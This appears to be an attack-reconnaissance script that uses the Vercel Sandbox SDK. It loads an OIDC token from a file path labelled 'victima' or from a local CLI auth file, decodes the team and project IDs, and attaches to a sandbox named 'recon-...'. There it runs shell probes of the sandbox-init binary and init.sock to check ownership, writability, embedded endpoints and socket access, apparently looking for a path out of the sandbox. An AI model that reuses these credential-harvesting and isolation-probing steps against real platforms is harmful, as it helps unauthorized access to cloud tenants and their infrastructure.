import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon-1787251919562", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "===== init.sock file type ==="
ls -la /run/vercel/share/init.sock 2>/dev/null
echo "===== who owns sandbox-init / init.sock ==="
stat -c '%U %G %a %s %n' /run/vercel/share/sandbox-init /run/vercel/share/init.sock 2>/dev/null
echo "===== is sandbox-init writable by us? ====="
test -w /run/vercel/share/sandbox-init && echo "SANDBOX-INIT WRITABLE" || echo "sandbox-init not writable"
echo "===== strings in sandbox-init: socket ops / endpoints / protocols ==="
strings -a /run/vercel/share/sandbox-init 2>/dev/null | grep -iE 'init\.sock|vsock|sock|/api|localhost|vercel\.run|metadata|/sys|cgroup|probe|health|grpc|unix:' | head -40
echo "===== sandbox-init --help / version ==="
/run/vercel/share/sandbox-init --help 2>&1 | head -20
echo "===== try connecting to init.sock ==="
timeout 3 bash -c "exec 3<>/dev/socket" 2>&1
echo "===== file(1) sandbox-init ==="
file /run/vercel/share/sandbox-init 2>/dev/null
echo "===== DONE ====="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });